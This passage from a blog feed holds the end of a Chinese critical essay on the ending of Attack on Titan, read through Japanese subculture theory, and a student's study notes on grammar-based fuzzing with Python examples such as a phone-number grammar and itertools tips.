alt="《进击的巨人》TV版第一季和最终季主海报对比：左边第一季海报上是艾伦面对袭来的铠甲巨人（莱纳），右边最终季海报是马莱战士莱纳面对袭来的进击的巨人（艾伦），视角完全反转.​"></p><p>在进入最后的“马莱篇”之前，巨人之谜已大半揭开：所谓巨人全是由与恶魔签订契约的尤弥尔之子民艾尔迪亚人变化而来。艾尔迪亚人曾凭借巨人之力屠戮过全世界。但到初代雷伊斯王时，由于厌倦了战争，王带领艾尔迪亚人退守帕拉迪岛，立下不战之誓，筑起三道高墙，消除民众记忆，从此与世隔绝。而另一部分滞留在大陆的艾尔迪亚人，则在大国马莱的统治下成为劣等民族，要么被用作无脑的战争怪兽，要么凭自己的努力成为马莱的战士，赢得荣誉马莱人的身份。作为惩罚，马莱不断将艾尔迪亚人流放到帕拉迪岛变成只会吞噬人类的无脑巨人，而为了夺取艾尔迪亚人掌握的始祖巨人之力以及帕拉迪岛上的资源，马莱派出战斗小队破坏玛丽亚之墙，则引发了所有的故事。</p><p>于是，在离开帕拉迪岛进入马莱篇之后，谏山创开始“自掘坟墓”，将作为《巨人》核心的自由之绝对价值给相对化了。这种相对化表现在叙述技法上，是从此前的艾尔迪亚视角转变为了（或曰增加了）马莱视角，而在主题上则是把“世界之谜”具体化为了“政治之谜”。</p><p>此前动不动就大喊大叫、情感波动巨大的中二主角艾伦，到了最终季“断裂”般地变为沉默寡言、高深莫测、独断专行的艾主席。他不动声色地推行着自己的隐秘计划，甚至不惜发动“地鸣”，让众多超大型巨人涉海而过，屠戮马莱无辜百姓。此前，观众都是通过艾伦的艾尔迪亚视角来观看巨人以及望向“墙外世界”，《巨人》的自由正是建立在这样的绝对观视之上。而到这里，无法进入艾主席视角的观众，只得通过此前的“敌人”马莱人的视角来观看似乎已然化身为恶魔的艾主席。在这样自反性的二阶观察之下，自由的绝对价值被瓦解了。调查兵团诸士兵的“死”开始变得不再那么崇高，甚至变得“可笑”，因为他们曾被认为是为了人类而牺牲，到头来却发现，他们不过是为两个民族/种族的继续相互屠戮作了炮灰。</p><p>而这种视角转变的基础，则是《巨人》通过引入民族国家议题，将对“世界真相”的本体论探寻降落为了对“世界难题”的政治性解决。这个难题首先在于：<strong>如果一个民族/种族可能会对另一个民族/种族构成威胁，那么如何处理这二者之间的关系？</strong> 该难题还有一个隐含的问题：<strong>如何处理这两个民族/种族之间的历史债务？</strong> 在此基础上，《巨人》通过“某族人可以把自己变为巨人”这样一个科幻般的设定，把这个难题推到了极端，构成了一个“政治绝境”：<strong>如果一个民族/种族的存在必定会对另一个民族/种族造成伤害，如何处理它们之间的关系？</strong> 在这种落实之下，曾经作为绝对独立的主体之自我实现的问题，立马被转变为了相对的主体间性问题，而且它还被牢牢地束缚在政治性的关系（甚至是你死我活的生死斗争）之中。于是，“世界”被瓦解了，取而代之的是民族国家的视域。</p><p>不过，这种“自掘坟墓”非但没有将《巨人》葬埋，反而开掘出了《巨人》在深度上超越以往同类型作品的可能性。</p><p>按照宇野常宽的论说，<strong>幸存系直接联系着决断主义的倾向</strong>，这是相对于1990年代“世界系”作品的心理主义倾向而言的。由日本评论家东浩纪（Azuma Hiroki）提出的世界系乃是一种越过社会、国家、历史，将自我与世界直接勾连的叙事想象力。这里的世界，用社会学家宫台真司（Miyadai Shinji）的话说，<strong>并非处于自我意识掌控之外的那个现实世界，而是被自我意识所标记的“世界”</strong>。换言之，<strong>世界系故事通过为自我所标记的“世界”来对自我进行无条件地认可，这样一种循环论证使世界系的主体获得了一种心理主义的完足感</strong>。典型代表便是1995年由庵野秀明监督的TV版动画《新世纪福音战士》（EVA）。宫台真司认为，EVA中世界之谜是作为自我之谜而存在的，对世界之谜的解决（人类补完）由是通过对自我之谜的解决（主人公碇真嗣内心的补完）来完成。因此，EVA的世界系实际上标记了一个“自我的时代”。</p><p>当然，<strong>世界系</strong>的出现本身也是晚期资本主义的文化逻辑在日本具体化的结果。在1990年代平成不况和奥姆真理教事件的冲击之下，其时的日本年轻人如同EVA的主人公碇真嗣一般，抱持着对父亲/社会的极大不信任感，并且意识到，在这个宏大叙事已然崩解的社会中，做出任何决断必然会伤害到他人，于是他们宁愿蜷缩在自己的岛宇宙之中，通过做一个躺平的死宅来实现某种抗拒。然而，如前文所述，2001年之后，这样的躺平不再可能。<strong>年轻人不得不在大逃杀之中成为一个决断主义者</strong>。不过，正如宇野常宽所提示的，决断主义并非对世界系的否定，毋宁说，它恰恰是接受了世界系的前提：<strong>做出决断，必定会伤害他人。但仍然要做出决断。这是被抛入残酷市场竞争机制之后的必然选择。每个人都选择自己想要尊奉的“神”，并通过将自己之神赋予超越异己诸神的普遍性来合理化自己的决断。但是这种普遍性只是虚妄。</strong> 换言之， <strong>决断主义者拥有的只是相对的真理，然而它被要求作为一种绝对真理来进行决断，由是伤害（对其他相对真理/小叙事的排斥）便不可避免。</strong> 在此基础上，幸存系既包含着决断主义，也包含着对互相伤害的决断主义之克服。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211201110628.png" alt="《死亡笔记》动画剧照，2006-2007."></p><p>但是怎么克服呢？回到心理主义的世界系吗？宇野常宽用大逃杀系作品《死亡笔记》的主人公夜神月来象征决断主义，并指出——碇真嗣无法阻止夜神月。</p><p>沿着这个思路，我们也许可以将《巨人》在马莱篇开始展开的剧情，视为探寻终结决断主义游戏的尝试。</p><p>前面说过，《巨人》的核心价值建立在对作为解释和解决的“墙外世界”之绝对信念之上，绝对信念导出了绝对自由。然而这种赖以建立“《巨人》大厦”的基础价值，在“墙外世界”被具象化之后，便被解释为了一种相对自由。换言之，决断主义主张的绝对价值被相对化了。通常的少年动漫，往往以几个稳固的核心价值（比如，正义、善良、自由、友爱、和平）为基础，并在此基础上展开主人公的成长故事，主人公的成长同时构成对这些作为基础的先验价值的习得和实践过程，因此无论故事世界如何被颠倒、角色们怎么打得天花乱坠，都不会动摇作品基础的核心价值，反而会强化它。这种教育主义的风格在少年动漫中比比皆是，《火影忍者》、《死神》、《海贼王》皆如此，更低龄向的作品更是以一种中世纪道德剧的作风将核心价值与人物进行直接对应（比如在《数码宝贝》中，八神太一对应勇气、石田大和对应友情等）。然而，在《巨人》这里，作为作品基础的核心价值被动摇了，这正是《巨人》超越此前教育主义少年动漫的地方：将自足的幻想世界祛魅化为一种决断主义并使之相对化。</p><p>但决断主义并不惧怕相对化。毋宁说，决断主义未能自觉的实质在于： <strong>重要的是决断本身，而非决断的内容。因此决断会给他人带来的伤害才根本不在考虑之列。</strong> 所以，即便使之相对化，把“未能自觉”变为“自觉”，仍然无法改变决断主义重在“决断”的立场。那么问题就变成了，通过怎样的相对化来终结决断主义的基础：大逃杀。</p><p>《巨人》的回答是：把它落实为政治问题。落实为政治问题，既是《巨人》将“解释”相对化的方法，也是它探索“解决”的方向。它通过引入两个民族国家（艾尔迪亚与马莱）以巨人之力（仿佛巨量的核武器）为核心的历史与当前的纷争，打开了一个朝向现实世界的窗口，通过这个窗口，当下的现实议题：历史债务问题、种族问题、民族国家问题开始涌入。《巨人》从对“外部”的追求开始，到后来发现不存在“外部”，“外部”就是“内部”，这使得它将问题变成了“外部”的实现，必须通过“内部”来完成。换言之，《巨人》将对大逃杀的解决放到了一个政治框架之中。<strong>这意味着要完成对决断主义的终结，必须要实现对历史债务与现实政治的覆写。</strong></p><p><strong>但这是一部漫画能完成的事情吗？</strong></p><p>《巨人》所能做的只是将作为决断主义者的艾伦摆到了一个主权者的位置上，并通过设定打开窗口让无法以“爽文”方式轻松解决的现实政治议题涌入。在这个意义上，艾伦不是鲁路修，艾伦比鲁路修难多了。</p><p>在终局之前，《巨人》最大的意义在于做出了这样一种努力的“姿态”：在这里，现实不是作为隐喻，而是作为无法消化的硬核，作为必须填补的空白，作为实在界朝向亚文化的想象力崩塌，而亚文化的想象力必须以某种方式“接住”它。</p><p>这就是《巨人》结局不失败的重要条件：以至少说得过去的方式，“接住”它，“解决”它。解决方式有上策有下策，要么谏山创确实聪明绝顶，想出了政治家们都无法想出的解决现实政治问题的方法，要么学习《反叛的鲁路修》和《守望者》，通过让主人公背负罪恶构造一种负面的共同体来维持脆弱的和平，要么利用关于巨人之力的剧情设定，在“巨人之力”这一“解释”之内完成对现实问题的想象性解决。总的来说，两条路：要么老实解决“政治之谜”，要么将“政治之谜”重新还原为“世界之谜”。无论好坏，在这两条路上，大致都能获得一个说得过去的结果。</p><p><strong>但《巨人》的失败就在于：谏山创没有选择任何一条解决路径，而径直跑回心理主义了！</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211201111015.png" alt="《进击的巨人》TV版最终季剧照，2021."></p><p>最终话《朝向那棵树》中，与艾伦青梅竹马的三笠斩下了决断主义主权者艾伦的头颅。一切真相揭开：主权者艾伦在马莱篇中对三笠冷脸恶语相加，到头来面具拿下，不过是他在傲娇，“不要啊！那种事情不要啊！我希望三笠在我死之后还想着我，至少持续十年吧！” <strong>而他悍然发动地鸣灭世计划，不是要解决什么政治问题，只是希望三笠、阿明等好友通过阻止他来留下好名声，成为世界的英雄，就是说，他屠戮生灵，就是为了给好友留笔遗产，为了对好友的“爱”。</strong> 这一切，都发生在他拥有了看到过去未来的能力之后，而这一能力 <strong>非但没有让他拥有相对于过去未来因果律的自由，反而使得他成为了这一因果律的奴隶，他朝向一个既定的结果，按部就班地“自由”迈去。</strong>在这一过程中，作为“世界之谜”的巨人始祖尤弥尔与巨人之力被以一个长达两千年的<strong>斯德哥尔摩综合征</strong>(百度百科讲的很详细)之爱轻易打发掉。在这个意义上，艾伦与尤弥尔构成镜像，他们都透过“爱”来获得某种“解脱”。</p><p>谏山创曾言明受到过1980年代的美国漫画《守望者》（Watchmen）的影响。在《守望者》的结局中，曼哈顿博士通过背负屠杀各国人民的罪恶，成为世界共同的敌人来实现美苏的和解，这一制造负面共同体的解决方案，带有明显的冷战色彩。但这种解决方案在后世仍然不断被借用。大逃杀系作品《反叛的鲁路修》的结局便是如此。但《巨人》明显地认识到了这种解决的虚妄，但它也想不出或者不愿去想出一个解决。所以它干脆撒手不管回到自我之中。就此看来，碇真嗣并不用去阻止夜神月，面具揭开，碇真嗣就是夜神月。</p><p><strong>心理主义者通过解决自我之谜来解决世界之谜，决断主义者通过（试图）解决世界之谜来解决自我之谜，而伪装成决断主义者的心理主义者则比较实在，世界的归世界，自己的归自己，我只管活我的，世界，去他妈的。</strong></p><p><strong>在这一点上，《巨人》的结局失败了，它的失败在于承认了我们在现实结构面前的绝对无能。但在另一点上，它或许又成功了，它意识到无论如何我们都无法解决“世界之谜”，我们能解决的只有自己</strong>。于是，在《巨人》崩坏的结局处，我们似乎能看到对一种友爱的小共同体的倡导。而这恰是后来大火的《鬼灭之刃》等动画的基础。但这能构成一种新的解决方案吗？</p><p>宫台真司在1990年代曾提出“<strong>永无终结的日常</strong>”这一说法，后来被广泛引用，它同时构成了对无法期待一种变革的消费社会之平静的绝望的象喻：<strong>只要某种基础性的结构仍然继续存续，那么即便经历了大地震和核灾难，“日常”也一样永无终结。</strong>而这种基础性的结构，正是《巨人》所不愿面对的那个带来了大逃杀的“世界”。</p><p>1993年，日本漫画家冈崎京子（Okazaki Kyoko）在其作品《河畔》中借用威廉·吉布森“平坦的战场”的说法，来描述“永无终结的日常”的感受：“从一开始就丧失一切的孩子们。已经拥有一切，而为这些事必须放弃一切的孩子们。无力的王子与公主。没有深度、一片平坦像是舞台背景般的战场。他/她们绝不会有什么波涛汹涌的人生，只是持续驻足在短暂的永恒当中。”</p><p>如今，基础结构仍未改变，但“平坦的战场”似乎消失了。</p><p>《巨人》以“致2000年后的你”为开始，而它的结局则是在告诉公元2000年之后的你：</p><p><strong>我们知道我们只得不停地战斗，只是我们不知道我们的“战场”究竟位于何处。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 动漫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进击的巨人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-5</title>
      <link href="/2021/11/30/bi-she-fuzz-5/"/>
      <url>/2021/11/30/bi-she-fuzz-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Notebook阅读"><a href="#Notebook阅读" class="headerlink" title="Notebook阅读"></a>Notebook阅读</h1><h2 id="Grammars"><a href="#Grammars" class="headerlink" title="Grammars"></a>Grammars</h2><p>首先就是要讲, 为什么我们需要语法来规范测试数据的生成. 在之前的讲解中, 相比我们也已经很清楚了, 依靠随机生成的测试数据几乎没有几个符合程序输入(假设程序对输入的数据有严格的限制的话). <strong>为了提高生成测试数据的效率, 必须要采用语法对生成测试数据的过程进行限制.</strong></p><blockquote><p>Compilers and Web browsers, of course, are not only domains where grammars are needed for testing, but also domains where grammars are well-known. Our claim in this book is that grammars can be used to generate almost any input, and our aim is to empower you to do precisely that.–浏览器和编译器是比较常见的需要用语法进行规范测试的两种领域. 但是我们的目的是要用语法精准的生成任何你想要的输入数据.</p></blockquote><h3 id="如何构建语法"><a href="#如何构建语法" class="headerlink" title="如何构建语法"></a>如何构建语法</h3><p>语法是一个非终止符和代替扩张list的一个映射<br><strong>A grammar is defined as a mapping of nonterminal symbols to lists of alternative expansions</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> US_PHONE_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">>></span><span class="token operator">></span>     <span class="token string">"&lt;start>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;phone-number>"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span>     <span class="token string">"&lt;phone-number>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"(&lt;area>)&lt;exchange>-&lt;line>"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span>     <span class="token string">"&lt;area>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;lead-digit>&lt;digit>&lt;digit>"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span>     <span class="token string">"&lt;exchange>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;lead-digit>&lt;digit>&lt;digit>"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span>     <span class="token string">"&lt;line>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;digit>&lt;digit>&lt;digit>&lt;digit>"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span>     <span class="token string">"&lt;lead-digit>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">>></span><span class="token operator">></span>     <span class="token string">"&lt;digit>"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据语法生成数据就是首先从<code>start</code>标签开始, 将<code>start</code>标签用后面的<code>phone-number</code>替换–(<strong>如果start对应多个非终止符号的话, 那就是随机挑一个非终止符号进行替换</strong>), 再用<code>(&lt;area&gt;)&lt;exchange&gt;-&lt;line&gt;</code>替换<code>phone-number</code>(<strong>如果phone-number对应多个非终止符号的话, 那就是随机挑一个非终止符号进行替换</strong>), 重复操作, 直到后面没有非终止符号为止. (<strong>当然, 像digit这种并没有对应非终止符号的, 也是同样随机挑一个就行</strong>)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span>simple_grammar_fuzzer<span class="token punctuation">(</span>US_PHONE_GRAMMAR<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'(692)449-5179'</span><span class="token punctuation">,</span> <span class="token string">'(519)230-7422'</span><span class="token punctuation">,</span> <span class="token string">'(613)761-0853'</span><span class="token punctuation">,</span> <span class="token string">'(979)881-3858'</span><span class="token punctuation">,</span> <span class="token string">'(810)914-5475'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大体的思路上就是这些, 后面讲述的内容. 是<strong>如何更好更快地构建语法</strong>, 因为不可能说所有的语法规则都依靠人工构建. 需要让语法变得非常方便添加\方便加入一些更符合输入数据的限制.</p><h3 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h3><ul><li>Grammars are powerful tools to express and produce syntactically valid inputs.</li><li>Inputs produced from grammars can be used as is, or <strong>used as seeds for mutation-based fuzzing.</strong></li><li>Grammars can be extended with character classes and operators to make writing easier.</li></ul><h3 id="py高阶用法"><a href="#py高阶用法" class="headerlink" title="py高阶用法"></a>py高阶用法</h3><h4 id="1-zip-longest"><a href="#1-zip-longest" class="headerlink" title="1 zip_longest"></a>1 zip_longest</h4><p>1、zip_longest需要导入itertools模块，且使用的时候需要指定一个填充值fillvalue。</p><p>2、当有可迭代对象遍历完，但其他对象还没有的时候，缺少的相应元素就会使用填充值进行填充。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> itertools <span class="token keyword">import</span> zip_longesta <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> num1<span class="token punctuation">,</span> num2 <span class="token keyword">in</span> zip_longest<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> fillvalue<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span><span class="token comment"># 0 1</span><span class="token comment"># 1 2</span><span class="token comment"># 2 3</span><span class="token comment"># 3 4</span><span class="token comment"># 4 5</span><span class="token comment"># 5 6</span><span class="token comment"># 6 7</span><span class="token comment"># 7 8</span><span class="token comment"># 8 -1</span><span class="token comment"># 9 -1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-kwargs"><a href="#2-kwargs" class="headerlink" title="2 **kwargs"></a>2 **kwargs</h4><p><code>**kwargs</code> 允许你将不定长度的键值对, 作为参数传递给一个函数。 如果你想要在一个函数里处理带名字的参数, 你应该使用<code>**kwargs</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">greet_me</span><span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> kwargs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0&#125; == &#123;1&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> greet_me<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"yasoob"</span><span class="token punctuation">)</span>name <span class="token operator">==</span> yasoob<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-作用域和命名空间"><a href="#3-作用域和命名空间" class="headerlink" title="3 作用域和命名空间"></a>3 作用域和命名空间</h4><p>详见菜鸟教程 <a href="https://www.runoob.com/python3/python3-namespace-scope.html">https://www.runoob.com/python3/python3-namespace-scope.html</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                           start_symbol<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    reachable <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_find_reachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">nonlocal</span> reachable <span class="token comment"># 这里用到了nonlocal</span>        reachable<span class="token punctuation">.</span>add<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>        <span class="token keyword">for</span> expansion <span class="token keyword">in</span> grammar<span class="token punctuation">.</span>get<span class="token punctuation">(</span>symbol<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> nonterminal <span class="token keyword">in</span> nonterminals<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nonterminal <span class="token keyword">not</span> <span class="token keyword">in</span> reachable<span class="token punctuation">:</span>                    _find_reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> nonterminal<span class="token punctuation">)</span>    _find_reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span>    <span class="token keyword">return</span> reachable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-set"><a href="#4-set" class="headerlink" title="4 set()"></a>4 set()</h4><p>set() 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span>x <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'runoob'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> y <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">,</span> y<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 重复的被删除</span><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">&amp;</span> y         <span class="token comment"># 交集</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">|</span> y         <span class="token comment"># 并集</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">-</span> y         <span class="token comment"># 差集</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-typing-Optional"><a href="#5-typing-Optional" class="headerlink" title="5 typing.Optional"></a>5 typing.Optional</h4><p><a href="https://blog.csdn.net/qq_44683653/article/details/108990873#:~:text=Python%20%E5%A4%A9%E7%94%9F%E4%B8%8D%E6%94%AF%E6%8C%81%20Option%20%E7%B1%BB%E5%9E%8B%EF%BC%8C%20typing%20%E6%9C%89%E4%B8%AA%20Optional%20%2C,%5B%20%28int%29%20-%3E%20Any%5D%27%20%28matched%20generic%20type%20%27Optiona">csdn</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211202112803.png" alt="typing.Optional"></p><blockquote><p>我觉得这几个函数写的非常好,简洁明了. 有些地方看的不是很懂,看来py的很多高级的用法并没有掌握到.</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>说实在的, 这一部分的思想是比较简单的, 但是在代码实现上, 确实用到了很多之前在写python程序时没有用到的写法,而且从代码书写的思路和简洁性上面来说, 比之前写的代码高了不知道几个档次. 再一次让我感觉到了, 原来写出来的代码可以这么写. 所以我在前面把这些方法都总结了下来, 包括后面的这些代码, 希望以后你可以多多的借鉴.  当然这也只是其中的一部分而已.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">def_used_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">:</span>                           <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span>Optional<span class="token punctuation">[</span>Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                        Optional<span class="token punctuation">[</span>Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>       <span class="token triple-quoted-string string">"""Return a pair (`defined_nonterminals`, `used_nonterminals`) in `grammar`.    In case of error, return (`None`, `None`)."""</span>    <span class="token comment"># 这里为什么用元组呢? 是因为元组没有办法被删除嘛?</span>    defined_nonterminals <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    used_nonterminals <span class="token operator">=</span> <span class="token punctuation">&#123;</span>start_symbol<span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> defined_nonterminal <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        defined_nonterminals<span class="token punctuation">.</span>add<span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span>        expansions <span class="token operator">=</span> grammar<span class="token punctuation">[</span>defined_nonterminal<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansions<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": expansion is not a list"</span><span class="token punctuation">,</span>                  <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token 